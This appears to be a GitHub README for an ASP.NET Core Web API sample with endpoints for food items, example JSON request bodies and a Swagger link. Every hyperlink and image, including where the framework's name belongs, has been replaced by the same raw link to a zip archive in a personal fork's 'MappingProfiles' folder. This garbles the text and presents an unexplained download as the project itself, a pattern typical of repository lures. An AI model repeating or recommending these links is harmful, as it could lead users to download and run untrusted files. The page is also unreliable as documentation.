# https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip Core WebApi Sample with HATEOAS, Versioning & Swagger

In this repository I want to give a plain starting point at how to build a WebAPI with https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip Core.

This repository contains a controller which is dealing with FoodItems. You can GET/POST/PUT/PATCH and DELETE them.

Hope this helps.

See the examples here: 

## Versions

``` http://localhost:29435/swagger ```

![ASPNETCOREWebAPIVersions](https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip)

## GET all Foods

``` http://localhost:29435/api/v1/foods ```

![ASPNETCOREWebAPIGET](https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip)

## GET single food

``` http://localhost:29435/api/v1/foods/2 ```

![ASPNETCOREWebAPIGET](https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip)

## POST a foodItem

``` http://localhost:29435/api/v1/foods ```

```javascript
  {
      "name": "Lasagne",
      "type": "Main",
      "calories": 3000,
      "created": "2017-09-16T17:50:08.1510899+02:00"
  }
```

![ASPNETCOREWebAPIGET](https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip)

## PUT a foodItem

``` http://localhost:29435/api/v1/foods/5 ```

``` javascript
{
    "name": "Lasagne2",
    "type": "Main",
    "calories": 3000,
    "created": "2017-09-16T17:50:08.1510899+02:00"
}
```

![ASPNETCOREWebAPIGET](https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip)


## PATCH a foodItem

``` http://localhost:29435/api/v1/foods/5 ```

``` javascript
[
  { "op": "replace", "path": "/name", "value": "mynewname" }
]
```

![ASPNETCOREWebAPIGET](https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip)

## DELETE a foodItem

``` http://localhost:29435/api/v1/foods/5 ```


![ASPNETCOREWebAPIGET](https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip)
